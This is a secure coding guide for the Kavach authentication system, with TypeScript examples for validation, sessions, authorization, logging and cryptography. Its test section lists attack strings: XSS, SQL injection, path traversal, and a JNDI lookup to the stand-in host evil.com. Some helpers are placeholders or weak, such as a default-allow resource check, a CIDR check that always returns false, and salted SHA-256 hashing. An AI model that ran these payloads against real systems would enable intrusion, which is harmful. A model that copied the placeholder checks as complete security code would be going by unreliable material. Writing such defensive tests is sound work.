# Secure Coding Guidelines

This document provides comprehensive secure coding guidelines for the Kavach authentication and user management system, covering best practices, common vulnerabilities, and implementation standards.

## Overview

Secure coding is fundamental to maintaining the security posture of the Kavach system. These guidelines cover:

- **Input Validation**: Comprehensive validation of all user inputs
- **Authentication Security**: Secure implementation of authentication mechanisms
- **Authorization Controls**: Proper access control implementation
- **Data Protection**: Secure handling of sensitive data
- **Error Handling**: Secure error handling and logging
- **Cryptographic Practices**: Proper use of cryptographic functions
- **API Security**: Secure API design and implementation

## Core Security Principles

### 1. Defense in Depth

Implement multiple layers of security controls:

```typescript
// Example: Multi-layer validation
export async function updateUserProfile(userId: string, data: any, context: RequestContext) {
  // Layer 1: Authentication check
  const session = await getSession();
  if (!session) {
    throw new UnauthorizedError('Authentication required');
  }

  // Layer 2: Authorization check
  if (session.userId !== userId && session.role !== 'admin') {
    throw new ForbiddenError('Insufficient permissions');
  }

  // Layer 3: Input validation
  const validationResult = ValidationService.validateProfileUpdate(data);
  if (!validationResult.success) {
    throw new ValidationError('Invalid input data', validationResult.errors);
  }

  // Layer 4: Business logic validation
  if (!await canUpdateProfile(userId, data)) {
    throw new BusinessLogicError('Profile update not allowed');
  }

  // Layer 5: Data sanitization
  const sanitizedData = sanitizeProfileData(validationResult.data);

  // Layer 6: Audit logging
  auditProfile({
    event: 'profile.updated',
    userId,
    ip: context.clientIP,
    requestId: context.correlationId
  });

  return await userRepository.update(userId, sanitizedData);
}
```

### 2. Principle of Least Privilege

Grant minimum necessary permissions:

```typescript
// Example: Role-based function access
export function requireMinimumRole(minimumRole: UserRole) {
  return function(target: any, propertyKey: string, descriptor: PropertyDescriptor) {
    const originalMethod = descriptor.value;

    descriptor.value = async function(...args: any[]) {
      const session = await getSession();
      
      if (!session) {
        throw new UnauthorizedError('Authentication required');
      }

      if (!hasMinimumRole(session.role, minimumRole)) {
        auditSecurity({
          event: 'security.unauthorized.access',
          userId: session.userId,
          severity: 'medium',
          metadata: { 
            requiredRole: minimumRole, 
            actualRole: session.role,
            method: propertyKey
          }
        });
        throw new ForbiddenError('Insufficient role permissions');
      }

      return originalMethod.apply(this, args);
    };
  };
}

// Usage
export class AdminController {
  @requireMinimumRole(UserRole.ADMIN)
  async deleteUser(userId: string) {
    // Only admins can access this method
  }

  @requireMinimumRole(UserRole.EXPERT)
  async updateService(serviceId: string) {
    // Experts and admins can access this method
  }
}
```

### 3. Fail Securely

Ensure failures don't compromise security:

```typescript
// Example: Secure failure handling
export async function authenticateUser(credentials: LoginCredentials): Promise<AuthResult> {
  try {
    // Validate input
    const validationResult = validateLoginCredentials(credentials);
    if (!validationResult.success) {
      // Fail securely - don't reveal validation details
      await recordFailedAttempt(credentials.email, 'invalid_input');
      throw new AuthenticationError('Invalid credentials');
    }

    // Find user
    const user = await userRepository.findByEmail(credentials.email);
    if (!user) {
      // Fail securely - don't reveal user existence
      await recordFailedAttempt(credentials.email, 'user_not_found');
      // Add timing delay to prevent user enumeration
      await new Promise(resolve => setTimeout(resolve, 100));
      throw new AuthenticationError('Invalid credentials');
    }

    // Verify password
    const isValidPassword = await verifyPassword(credentials.password, user.passwordHash);
    if (!isValidPassword) {
      await recordFailedAttempt(credentials.email, 'invalid_password');
      // Same error message to prevent information leakage
      throw new AuthenticationError('Invalid credentials');
    }

    // Success path
    return await createAuthResult(user);
    
  } catch (error) {
    // Log error securely (without sensitive data)
    console.error('Authentication failed:', {
      email: credentials.email,
      error: error.message,
      timestamp: new Date().toISOString()
    });
    
    // Re-throw or return secure error
    if (error instanceof AuthenticationError) {
      throw error;
    }
    
    // For unexpected errors, fail securely
    throw new AuthenticationError('Authentication failed');
  }
}
```

## Input Validation and Sanitization

### 1. Comprehensive Input Validation

```typescript
import { z } from 'zod';
import DOMPurify from 'isomorphic-dompurify';

// Define strict validation schemas
export const userRegistrationSchema = z.object({
  email: z.string()
    .email('Invalid email format')
    .max(255, 'Email too long')
    .toLowerCase()
    .trim(),
  
  firstName: z.string()
    .min(1, 'First name required')
    .max(50, 'First name too long')
    .regex(/^[a-zA-Z\s'-]+$/, 'Invalid characters in first name')
    .trim(),
  
  lastName: z.string()
    .min(1, 'Last name required')
    .max(50, 'Last name too long')
    .regex(/^[a-zA-Z\s'-]+$/, 'Invalid characters in last name')
    .trim(),
  
  password: z.string()
    .min(8, 'Password must be at least 8 characters')
    .max(128, 'Password too long')
    .regex(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*])/, 'Password does not meet complexity requirements'),
  
  role: z.enum(['customer', 'expert'], {
    errorMap: () => ({ message: 'Invalid role specified' })
  })
});

// Validation function with detailed error handling
export function validateUserRegistration(data: unknown): ValidationResult<UserRegistrationData> {
  try {
    const validated = userRegistrationSchema.parse(data);
    return {
      success: true,
      data: validated,
      errors: {}
    };
  } catch (error) {
    if (error instanceof z.ZodError) {
      const errors: Record<string, string> = {};
      error.errors.forEach(err => {
        const path = err.path.join('.');
        errors[path] = err.message;
      });
      
      return {
        success: false,
        data: null,
        errors
      };
    }
    
    // Unexpected validation error
    console.error('Validation error:', error);
    return {
      success: false,
      data: null,
      errors: { general: 'Validation failed' }
    };
  }
}

// HTML sanitization for user-generated content
export function sanitizeHtmlContent(content: string): string {
  return DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'u'],
    ALLOWED_ATTR: [],
    KEEP_CONTENT: true
  });
}

// SQL injection prevention (using parameterized queries)
export async function findUsersByRole(role: string): Promise<User[]> {
  // ✅ Correct: Using parameterized query
  return await db.query(
    'SELECT * FROM users WHERE role = $1 AND is_active = true',
    [role]
  );
  
  // ❌ Incorrect: String concatenation (vulnerable to SQL injection)
  // return await db.query(`SELECT * FROM users WHERE role = '${role}'`);
}
```

### 2. File Upload Security

```typescript
import multer from 'multer';
import path from 'path';
import { createHash } from 'crypto';

// Secure file upload configuration
const ALLOWED_MIME_TYPES = [
  'image/jpeg',
  'image/png',
  'image/gif',
  'application/pdf'
];

const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5MB

export const secureFileUpload = multer({
  storage: multer.memoryStorage(),
  limits: {
    fileSize: MAX_FILE_SIZE,
    files: 1
  },
  fileFilter: (req, file, cb) => {
    // Validate MIME type
    if (!ALLOWED_MIME_TYPES.includes(file.mimetype)) {
      return cb(new Error('Invalid file type'));
    }
    
    // Validate file extension
    const ext = path.extname(file.originalname).toLowerCase();
    const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.pdf'];
    if (!allowedExtensions.includes(ext)) {
      return cb(new Error('Invalid file extension'));
    }
    
    cb(null, true);
  }
});

// File processing with additional security checks
export async function processUploadedFile(file: Express.Multer.File, userId: string): Promise<FileResult> {
  // Additional MIME type validation using file content
  const actualMimeType = await detectMimeType(file.buffer);
  if (actualMimeType !== file.mimetype) {
    throw new ValidationError('File content does not match declared type');
  }
  
  // Scan for malware (placeholder - integrate with actual scanner)
  const isSafe = await scanForMalware(file.buffer);
  if (!isSafe) {
    auditSecurity({
      event: 'security.malware.detected',
      userId,
      severity: 'high',
      metadata: { 
        filename: file.originalname,
        mimetype: file.mimetype,
        size: file.size
      }
    });
    throw new SecurityError('File failed security scan');
  }
  
  // Generate secure filename
  const hash = createHash('sha256').update(file.buffer).digest('hex');
  const ext = path.extname(file.originalname);
  const secureFilename = `${hash}${ext}`;
  
  // Store file securely
  const filePath = await storeFileSecurely(file.buffer, secureFilename, userId);
  
  return {
    filename: secureFilename,
    originalName: file.originalname,
    path: filePath,
    size: file.size,
    mimetype: file.mimetype
  };
}
```

## Authentication Security

### 1. Secure Password Handling

```typescript
import * as bcrypt from 'bcryptjs';
import { randomBytes } from 'crypto';

export class SecurePasswordManager {
  private static readonly SALT_ROUNDS = 12;
  private static readonly MAX_PASSWORD_LENGTH = 128;
  private static readonly MIN_PASSWORD_LENGTH = 8;

  static async hashPassword(password: string): Promise<string> {
    // Validate password length
    if (password.length < this.MIN_PASSWORD_LENGTH || password.length > this.MAX_PASSWORD_LENGTH) {
      throw new ValidationError('Invalid password length');
    }

    try {
      // Generate salt and hash
      const salt = await bcrypt.genSalt(this.SALT_ROUNDS);
      return await bcrypt.hash(password, salt);
    } catch (error) {
      console.error('Password hashing failed:', error);
      throw new CryptographicError('Failed to hash password');
    }
  }

  static async verifyPassword(password: string, hash: string): Promise<boolean> {
    try {
      // Constant-time comparison to prevent timing attacks
      return await bcrypt.compare(password, hash);
    } catch (error) {
      console.error('Password verification failed:', error);
      return false; // Fail securely
    }
  }

  static async needsRehash(hash: string): Promise<boolean> {
    try {
      const rounds = bcrypt.getRounds(hash);
      return rounds < this.SALT_ROUNDS;
    } catch (error) {
      console.error('Hash check failed:', error);
      return true; // Assume rehash needed on error
    }
  }

  static generateSecurePassword(length: number = 16): string {
    if (length < 12) length = 12; // Minimum secure length

    const lowercase = 'abcdefghijklmnopqrstuvwxyz';
    const uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const numbers = '0123456789';
    const special = '!@#$%^&*(),.?":{}|<>';
    const categories = [lowercase, uppercase, numbers, special];

    const all = categories.join('');
    const bytes = randomBytes(length);
    const chars: string[] = [];

    // Ensure at least one character from each category
    categories.forEach((set, i) => {
      chars[i] = set[bytes[i] % set.length];
    });

    // Fill remaining positions
    for (let i = categories.length; i < length; i++) {
      chars[i] = all[bytes[i] % all.length];
    }

    // Shuffle array using Fisher-Yates algorithm
    for (let i = chars.length - 1; i > 0; i--) {
      const j = bytes[i] % (i + 1);
      [chars[i], chars[j]] = [chars[j], chars[i]];
    }

    return chars.join('');
  }
}
```

### 2. Session Security

```typescript
export class SecureSessionManager {
  private static readonly SESSION_TIMEOUT = 30 * 60 * 1000; // 30 minutes
  private static readonly ABSOLUTE_TIMEOUT = 8 * 60 * 60 * 1000; // 8 hours

  static async createSecureSession(userId: string, userAgent?: string, ip?: string): Promise<SessionData> {
    // Generate cryptographically secure session ID
    const sessionId = this.generateSecureSessionId();
    
    // Create session fingerprint for hijacking detection
    const fingerprint = this.createSessionFingerprint(userAgent, ip);
    
    const sessionData: SessionData = {
      sessionId,
      userId,
      createdAt: new Date(),
      lastActivity: new Date(),
      expiresAt: new Date(Date.now() + this.SESSION_TIMEOUT),
      absoluteExpiresAt: new Date(Date.now() + this.ABSOLUTE_TIMEOUT),
      fingerprint,
      isActive: true
    };

    // Store session securely
    await this.storeSession(sessionData);
    
    // Audit session creation
    auditAuth({
      event: 'auth.session.created',
      userId,
      sessionId,
      ip,
      severity: 'low'
    });

    return sessionData;
  }

  static async validateSession(sessionId: string, userAgent?: string, ip?: string): Promise<SessionData | null> {
    try {
      const session = await this.getSession(sessionId);
      if (!session) {
        return null;
      }

      // Check if session is expired
      if (session.expiresAt < new Date() || session.absoluteExpiresAt < new Date()) {
        await this.invalidateSession(sessionId);
        return null;
      }

      // Validate session fingerprint
      const currentFingerprint = this.createSessionFingerprint(userAgent, ip);
      if (session.fingerprint !== currentFingerprint) {
        // Potential session hijacking
        auditSecurity({
          event: 'security.session.hijack.attempt',
          userId: session.userId,
          sessionId,
          ip,
          severity: 'high',
          metadata: {
            expectedFingerprint: session.fingerprint,
            actualFingerprint: currentFingerprint
          }
        });
        
        await this.invalidateSession(sessionId);
        return null;
      }

      // Update last activity and extend session
      session.lastActivity = new Date();
      session.expiresAt = new Date(Date.now() + this.SESSION_TIMEOUT);
      await this.updateSession(session);

      return session;
    } catch (error) {
      console.error('Session validation failed:', error);
      return null;
    }
  }

  private static generateSecureSessionId(): string {
    const timestamp = Date.now().toString(36);
    const randomData = randomBytes(32).toString('hex');
    return `${timestamp}_${randomData}`;
  }

  private static createSessionFingerprint(userAgent?: string, ip?: string): string {
    const components = [
      userAgent || 'unknown',
      ip || 'unknown'
    ];
    
    return createHash('sha256')
      .update(components.join('|'))
      .digest('hex');
  }
}
```

## Authorization and Access Control

### 1. Secure Authorization Implementation

```typescript
export class SecureAuthorizationManager {
  /**
   * Check if user has permission to perform action on resource
   */
  static async checkPermission(
    userId: string,
    resource: string,
    action: string,
    context?: AuthorizationContext
  ): Promise<AuthorizationResult> {
    try {
      // Get user session and role
      const user = await userRepository.findById(userId);
      if (!user) {
        return { allowed: false, reason: 'User not found' };
      }

      // Check if user account is active
      if (!this.isAccountActive(user)) {
        auditSecurity({
          event: 'security.unauthorized.access',
          userId,
          severity: 'medium',
          metadata: { reason: 'inactive_account', resource, action }
        });
        return { allowed: false, reason: 'Account inactive' };
      }

      // Check role-based permissions
      const rolePermission = await this.checkRolePermission(user.role, resource, action);
      if (!rolePermission.allowed) {
        auditSecurity({
          event: 'security.unauthorized.access',
          userId,
          severity: 'medium',
          metadata: { 
            reason: 'insufficient_role_permissions',
            userRole: user.role,
            resource,
            action
          }
        });
        return rolePermission;
      }

      // Check resource-specific permissions
      const resourcePermission = await this.checkResourcePermission(userId, resource, action, context);
      if (!resourcePermission.allowed) {
        auditSecurity({
          event: 'security.unauthorized.access',
          userId,
          severity: 'medium',
          metadata: { 
            reason: 'insufficient_resource_permissions',
            resource,
            action
          }
        });
        return resourcePermission;
      }

      // Check contextual permissions (time-based, location-based, etc.)
      const contextualPermission = await this.checkContextualPermission(userId, resource, action, context);
      if (!contextualPermission.allowed) {
        return contextualPermission;
      }

      // All checks passed
      auditAuth({
        event: 'auth.authorization.granted',
        userId,
        resource,
        action,
        severity: 'low'
      });

      return { allowed: true };
    } catch (error) {
      console.error('Authorization check failed:', error);
      
      // Fail securely - deny access on error
      auditSecurity({
        event: 'security.authorization.error',
        userId,
        severity: 'high',
        error: error.message,
        metadata: { resource, action }
      });
      
      return { allowed: false, reason: 'Authorization check failed' };
    }
  }

  private static isAccountActive(user: User): boolean {
    return !user.isBanned && 
           !user.isPaused && 
           user.isEmailVerified &&
           (user.role !== 'expert' || user.isApproved);
  }

  private static async checkRolePermission(
    role: string,
    resource: string,
    action: string
  ): Promise<AuthorizationResult> {
    const permissions = await this.getRolePermissions(role);
    
    // Check for explicit permission
    const hasPermission = permissions.some(p => 
      p.resource === resource && p.actions.includes(action)
    );

    if (hasPermission) {
      return { allowed: true };
    }

    // Check for wildcard permissions
    const hasWildcardPermission = permissions.some(p =>
      (p.resource === '*' || p.resource === resource) &&
      (p.actions.includes('*') || p.actions.includes(action))
    );

    return {
      allowed: hasWildcardPermission,
      reason: hasWildcardPermission ? undefined : 'Insufficient role permissions'
    };
  }

  private static async checkResourcePermission(
    userId: string,
    resource: string,
    action: string,
    context?: AuthorizationContext
  ): Promise<AuthorizationResult> {
    // Resource ownership check
    if (resource.startsWith('user:') && action !== 'create') {
      const resourceUserId = resource.split(':')[1];
      if (resourceUserId === userId) {
        return { allowed: true }; // Users can access their own resources
      }
    }

    // Additional resource-specific checks would go here
    return { allowed: true };
  }

  private static async checkContextualPermission(
    userId: string,
    resource: string,
    action: string,
    context?: AuthorizationContext
  ): Promise<AuthorizationResult> {
    if (!context) {
      return { allowed: true };
    }

    // Time-based restrictions
    if (context.timeRestrictions) {
      const now = new Date();
      const currentHour = now.getHours();
      
      if (!context.timeRestrictions.allowedHours.includes(currentHour)) {
        return { allowed: false, reason: 'Access not allowed at this time' };
      }
    }

    // IP-based restrictions
    if (context.ipRestrictions && context.clientIP) {
      const isAllowedIP = context.ipRestrictions.allowedIPs.some(allowedIP =>
        this.isIPInRange(context.clientIP!, allowedIP)
      );
      
      if (!isAllowedIP) {
        auditSecurity({
          event: 'security.unauthorized.access',
          userId,
          ip: context.clientIP,
          severity: 'high',
          metadata: { reason: 'ip_not_allowed', resource, action }
        });
        return { allowed: false, reason: 'Access not allowed from this IP' };
      }
    }

    return { allowed: true };
  }

  private static isIPInRange(ip: string, range: string): boolean {
    // Simple IP range check (implement proper CIDR matching in production)
    if (range.includes('/')) {
      // CIDR notation
      return this.isIPInCIDR(ip, range);
    } else {
      // Exact match
      return ip === range;
    }
  }

  private static isIPInCIDR(ip: string, cidr: string): boolean {
    // Implement CIDR matching logic
    // This is a simplified version - use a proper library in production
    return false;
  }
}
```

## Error Handling and Logging

### 1. Secure Error Handling

```typescript
export class SecureErrorHandler {
  /**
   * Handle errors securely without leaking sensitive information
   */
  static handleError(error: Error, context: ErrorContext): ErrorResponse {
    // Log full error details securely
    this.logError(error, context);

    // Return sanitized error to client
    if (error instanceof ValidationError) {
      return {
        success: false,
        error: 'Validation failed',
        details: error.getPublicDetails(), // Only non-sensitive validation errors
        code: 'VALIDATION_ERROR'
      };
    }

    if (error instanceof AuthenticationError) {
      return {
        success: false,
        error: 'Authentication failed',
        code: 'AUTH_ERROR'
      };
    }

    if (error instanceof AuthorizationError) {
      return {
        success: false,
        error: 'Access denied',
        code: 'ACCESS_DENIED'
      };
    }

    if (error instanceof RateLimitError) {
      return {
        success: false,
        error: 'Too many requests',
        retryAfter: error.retryAfter,
        code: 'RATE_LIMIT_EXCEEDED'
      };
    }

    // For unexpected errors, return generic message
    return {
      success: false,
      error: 'An error occurred',
      code: 'INTERNAL_ERROR'
    };
  }

  private static logError(error: Error, context: ErrorContext): void {
    const errorLog = {
      timestamp: new Date().toISOString(),
      error: {
        name: error.name,
        message: error.message,
        stack: error.stack
      },
      context: {
        userId: context.userId,
        requestId: context.requestId,
        ip: context.ip,
        userAgent: context.userAgent,
        endpoint: context.endpoint,
        method: context.method
      },
      severity: this.getErrorSeverity(error)
    };

    // Log to secure error logging system
    console.error('Application error:', errorLog);

    // Send to external monitoring if critical
    if (errorLog.severity === 'critical') {
      this.sendCriticalErrorAlert(errorLog);
    }
  }

  private static getErrorSeverity(error: Error): 'low' | 'medium' | 'high' | 'critical' {
    if (error instanceof ValidationError || error instanceof AuthenticationError) {
      return 'low';
    }
    
    if (error instanceof AuthorizationError || error instanceof RateLimitError) {
      return 'medium';
    }
    
    if (error instanceof SecurityError) {
      return 'high';
    }
    
    // Unknown errors are critical
    return 'critical';
  }

  private static async sendCriticalErrorAlert(errorLog: any): Promise<void> {
    // Implementation would send alerts to monitoring systems
    // Slack, PagerDuty, email, etc.
  }
}

// Custom error classes with secure handling
export class ValidationError extends Error {
  constructor(
    message: string,
    public readonly validationErrors: Record<string, string>,
    public readonly correlationId?: string
  ) {
    super(message);
    this.name = 'ValidationError';
  }

  getPublicDetails(): Record<string, string> {
    // Return only safe validation errors
    const safeErrors: Record<string, string> = {};
    
    for (const [field, error] of Object.entries(this.validationErrors)) {
      // Filter out potentially sensitive error messages
      if (!this.isSensitiveField(field) && !this.isSensitiveError(error)) {
        safeErrors[field] = error;
      }
    }
    
    return safeErrors;
  }

  private isSensitiveField(field: string): boolean {
    const sensitiveFields = ['password', 'token', 'secret', 'key'];
    return sensitiveFields.some(sensitive => field.toLowerCase().includes(sensitive));
  }

  private isSensitiveError(error: string): boolean {
    const sensitivePatterns = [
      /database/i,
      /internal/i,
      /system/i,
      /server/i
    ];
    return sensitivePatterns.some(pattern => pattern.test(error));
  }
}
```

### 2. Secure Logging Practices

```typescript
export class SecureLogger {
  private static sensitiveFields = [
    'password',
    'token',
    'secret',
    'key',
    'authorization',
    'cookie',
    'session',
    'ssn',
    'creditcard',
    'bankaccount'
  ];

  /**
   * Log data securely by scrubbing sensitive information
   */
  static logSecurely(level: 'info' | 'warn' | 'error', message: string, data?: any): void {
    const scrubbedData = data ? this.scrubSensitiveData(data) : undefined;
    
    const logEntry = {
      timestamp: new Date().toISOString(),
      level,
      message,
      data: scrubbedData,
      correlationId: this.getCorrelationId()
    };

    // Use appropriate logging method
    switch (level) {
      case 'info':
        console.info(JSON.stringify(logEntry));
        break;
      case 'warn':
        console.warn(JSON.stringify(logEntry));
        break;
      case 'error':
        console.error(JSON.stringify(logEntry));
        break;
    }
  }

  private static scrubSensitiveData(data: any): any {
    if (typeof data !== 'object' || data === null) {
      return data;
    }

    if (Array.isArray(data)) {
      return data.map(item => this.scrubSensitiveData(item));
    }

    const scrubbed: any = {};
    
    for (const [key, value] of Object.entries(data)) {
      if (this.isSensitiveField(key)) {
        scrubbed[key] = '[REDACTED]';
      } else if (typeof value === 'object') {
        scrubbed[key] = this.scrubSensitiveData(value);
      } else {
        scrubbed[key] = value;
      }
    }

    return scrubbed;
  }

  private static isSensitiveField(fieldName: string): boolean {
    const lowerFieldName = fieldName.toLowerCase();
    return this.sensitiveFields.some(sensitive => 
      lowerFieldName.includes(sensitive)
    );
  }

  private static getCorrelationId(): string {
    // Get correlation ID from async context or generate new one
    return randomBytes(8).toString('hex');
  }
}
```

## API Security

### 1. Secure API Design

```typescript
// Secure API route handler
export async function secureApiHandler(
  handler: (req: NextRequest, context: RequestContext) => Promise<any>
) {
  return async (req: NextRequest) => {
    const startTime = Date.now();
    const correlationId = generateCorrelationId();
    
    try {
      // Create request context
      const context: RequestContext = {
        correlationId,
        clientIP: getClientIP(req),
        userAgent: req.headers.get('user-agent') || undefined,
        timestamp: new Date()
      };

      // Rate limiting
      const rateLimitResult = await checkRateLimit(req);
      if (!rateLimitResult.success) {
        return NextResponse.json(
          { error: 'Rate limit exceeded', retryAfter: rateLimitResult.retryAfter },
          { status: 429 }
        );
      }

      // Input validation
      const body = await validateRequestBody(req);
      
      // Execute handler
      const result = await handler(req, context);
      
      // Log successful request
      SecureLogger.logSecurely('info', 'API request completed', {
        method: req.method,
        url: req.url,
        statusCode: 200,
        duration: Date.now() - startTime,
        correlationId
      });

      return NextResponse.json(result);
      
    } catch (error) {
      // Handle error securely
      const errorResponse = SecureErrorHandler.handleError(error as Error, {
        correlationId,
        requestId: correlationId,
        ip: getClientIP(req),
        userAgent: req.headers.get('user-agent') || undefined,
        endpoint: req.url,
        method: req.method
      });

      const statusCode = getStatusCodeForError(error as Error);
      
      return NextResponse.json(errorResponse, { status: statusCode });
    }
  };
}

// Usage example
export const POST = secureApiHandler(async (req: NextRequest, context: RequestContext) => {
  const session = await getSession();
  if (!session) {
    throw new AuthenticationError('Authentication required');
  }

  const body = await req.json();
  const validationResult = validateUserUpdate(body);
  
  if (!validationResult.success) {
    throw new ValidationError('Invalid input', validationResult.errors, context.correlationId);
  }

  // Process request
  const result = await updateUser(session.userId, validationResult.data);
  
  return { success: true, data: result };
});
```

### 2. Request Validation and Sanitization

```typescript
export class ApiRequestValidator {
  /**
   * Validate and sanitize API request body
   */
  static async validateRequestBody(req: NextRequest): Promise<any> {
    try {
      // Check content type
      const contentType = req.headers.get('content-type');
      if (!contentType || !contentType.includes('application/json')) {
        throw new ValidationError('Invalid content type', { contentType: 'Must be application/json' });
      }

      // Parse JSON with size limit
      const text = await req.text();
      if (text.length > 1024 * 1024) { // 1MB limit
        throw new ValidationError('Request too large', { size: 'Request body exceeds 1MB limit' });
      }

      const body = JSON.parse(text);
      
      // Basic structure validation
      if (typeof body !== 'object' || body === null) {
        throw new ValidationError('Invalid request body', { body: 'Must be a JSON object' });
      }

      // Sanitize the body
      return this.sanitizeObject(body);
      
    } catch (error) {
      if (error instanceof SyntaxError) {
        throw new ValidationError('Invalid JSON', { json: 'Request body contains invalid JSON' });
      }
      throw error;
    }
  }

  private static sanitizeObject(obj: any): any {
    if (typeof obj !== 'object' || obj === null) {
      return obj;
    }

    if (Array.isArray(obj)) {
      return obj.map(item => this.sanitizeObject(item));
    }

    const sanitized: any = {};
    
    for (const [key, value] of Object.entries(obj)) {
      // Sanitize key
      const sanitizedKey = this.sanitizeString(key);
      
      // Sanitize value
      if (typeof value === 'string') {
        sanitized[sanitizedKey] = this.sanitizeString(value);
      } else if (typeof value === 'object') {
        sanitized[sanitizedKey] = this.sanitizeObject(value);
      } else {
        sanitized[sanitizedKey] = value;
      }
    }

    return sanitized;
  }

  private static sanitizeString(str: string): string {
    // Remove null bytes and control characters
    return str.replace(/[\x00-\x1F\x7F]/g, '');
  }
}
```

## Cryptographic Security

### 1. Secure Random Generation

```typescript
import { randomBytes, randomInt } from 'crypto';

export class SecureRandom {
  /**
   * Generate cryptographically secure random bytes
   */
  static generateBytes(length: number): Buffer {
    return randomBytes(length);
  }

  /**
   * Generate cryptographically secure random string
   */
  static generateString(length: number, charset?: string): string {
    const defaultCharset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const chars = charset || defaultCharset;
    
    const bytes = randomBytes(length);
    let result = '';
    
    for (let i = 0; i < length; i++) {
      result += chars[bytes[i] % chars.length];
    }
    
    return result;
  }

  /**
   * Generate cryptographically secure random integer
   */
  static generateInt(min: number, max: number): number {
    return randomInt(min, max + 1);
  }

  /**
   * Generate secure token for API keys, session IDs, etc.
   */
  static generateToken(length: number = 32): string {
    return randomBytes(length).toString('hex');
  }

  /**
   * Generate UUID v4
   */
  static generateUUID(): string {
    if (typeof globalThis.crypto?.randomUUID === 'function') {
      return globalThis.crypto.randomUUID();
    }
    
    // Fallback implementation
    const bytes = randomBytes(16);
    
    // Set version (4) and variant bits
    bytes[6] = (bytes[6] & 0x0f) | 0x40;
    bytes[8] = (bytes[8] & 0x3f) | 0x80;
    
    const hex = bytes.toString('hex');
    return `${hex.slice(0, 8)}-${hex.slice(8, 12)}-${hex.slice(12, 16)}-${hex.slice(16, 20)}-${hex.slice(20)}`;
  }
}
```

### 2. Secure Hashing

```typescript
import { createHash, createHmac, timingSafeEqual } from 'crypto';

export class SecureHashing {
  /**
   * Create secure hash of data
   */
  static hash(data: string | Buffer, algorithm: string = 'sha256'): string {
    return createHash(algorithm).update(data).digest('hex');
  }

  /**
   * Create HMAC with secret key
   */
  static hmac(data: string | Buffer, key: string | Buffer, algorithm: string = 'sha256'): string {
    return createHmac(algorithm, key).update(data).digest('hex');
  }

  /**
   * Verify HMAC in constant time to prevent timing attacks
   */
  static verifyHmac(data: string | Buffer, key: string | Buffer, expectedHmac: string, algorithm: string = 'sha256'): boolean {
    const actualHmac = this.hmac(data, key, algorithm);
    const expectedBuffer = Buffer.from(expectedHmac, 'hex');
    const actualBuffer = Buffer.from(actualHmac, 'hex');
    
    // Ensure buffers are same length to prevent timing attacks
    if (expectedBuffer.length !== actualBuffer.length) {
      return false;
    }
    
    return timingSafeEqual(expectedBuffer, actualBuffer);
  }

  /**
   * Create secure hash with salt
   */
  static hashWithSalt(data: string, salt?: string): { hash: string; salt: string } {
    const actualSalt = salt || SecureRandom.generateString(32);
    const hash = this.hash(data + actualSalt);
    
    return { hash, salt: actualSalt };
  }

  /**
   * Verify hash with salt
   */
  static verifyHashWithSalt(data: string, hash: string, salt: string): boolean {
    const computedHash = this.hash(data + salt);
    return timingSafeEqual(Buffer.from(hash), Buffer.from(computedHash));
  }
}
```

## Testing Security

### 1. Security Test Examples

```typescript
describe('Security Tests', () => {
  describe('Input Validation', () => {
    test('should reject malicious input', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        "'; DROP TABLE users; --",
        '../../../etc/passwd',
        '${jndi:ldap://evil.com/a}'
      ];

      for (const input of maliciousInputs) {
        expect(() => validateUserInput(input)).toThrow(ValidationError);
      }
    });

    test('should sanitize HTML content', () => {
      const maliciousHtml = '<script>alert("xss")</script><p>Safe content</p>';
      const sanitized = sanitizeHtmlContent(maliciousHtml);
      
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).toContain('<p>Safe content</p>');
    });
  });

  describe('Authentication Security', () => {
    test('should hash passwords securely', async () => {
      const password = 'testPassword123!';
      const hash = await SecurePasswordManager.hashPassword(password);
      
      expect(hash).not.toBe(password);
      expect(hash.length).toBeGreaterThan(50);
      expect(await SecurePasswordManager.verifyPassword(password, hash)).toBe(true);
      expect(await SecurePasswordManager.verifyPassword('wrongPassword', hash)).toBe(false);
    });

    test('should prevent timing attacks in password verification', async () => {
      const password = 'testPassword123!';
      const hash = await SecurePasswordManager.hashPassword(password);
      
      // Measure timing for correct and incorrect passwords
      const times: number[] = [];
      
      for (let i = 0; i < 10; i++) {
        const start = process.hrtime.bigint();
        await SecurePasswordManager.verifyPassword('wrongPassword', hash);
        const end = process.hrtime.bigint();
        times.push(Number(end - start));
      }
      
      // Timing should be relatively consistent (within reasonable variance)
      const avg = times.reduce((a, b) => a + b) / times.length;
      const variance = times.reduce((sum, time) => sum + Math.pow(time - avg, 2), 0) / times.length;
      const stdDev = Math.sqrt(variance);
      
      // Standard deviation should be relatively small compared to average
      expect(stdDev / avg).toBeLessThan(0.5);
    });
  });

  describe('Authorization Security', () => {
    test('should enforce role-based access control', async () => {
      const customerUser = { id: 'user1', role: 'customer' };
      const adminUser = { id: 'user2', role: 'admin' };
      
      // Customer should not access admin resources
      const customerResult = await SecureAuthorizationManager.checkPermission(
        customerUser.id, 'admin:users', 'read'
      );
      expect(customerResult.allowed).toBe(false);
      
      // Admin should access admin resources
      const adminResult = await SecureAuthorizationManager.checkPermission(
        adminUser.id, 'admin:users', 'read'
      );
      expect(adminResult.allowed).toBe(true);
    });
  });

  describe('Cryptographic Security', () => {
    test('should generate cryptographically secure random values', () => {
      const token1 = SecureRandom.generateToken();
      const token2 = SecureRandom.generateToken();
      
      expect(token1).not.toBe(token2);
      expect(token1.length).toBe(64); // 32 bytes = 64 hex chars
      expect(/^[a-f0-9]+$/i.test(token1)).toBe(true);
    });

    test('should verify HMAC in constant time', () => {
      const data = 'test data';
      const key = 'secret key';
      const validHmac = SecureHashing.hmac(data, key);
      const invalidHmac = 'invalid';
      
      expect(SecureHashing.verifyHmac(data, key, validHmac)).toBe(true);
      expect(SecureHashing.verifyHmac(data, key, invalidHmac)).toBe(false);
    });
  });
});
```

## Security Checklist

### Development Phase
- [ ] Input validation implemented for all user inputs
- [ ] Output encoding/escaping implemented
- [ ] SQL injection prevention (parameterized queries)
- [ ] XSS prevention (content sanitization)
- [ ] CSRF protection implemented
- [ ] Secure authentication mechanisms
- [ ] Proper authorization checks
- [ ] Secure session management
- [ ] Cryptographically secure random generation
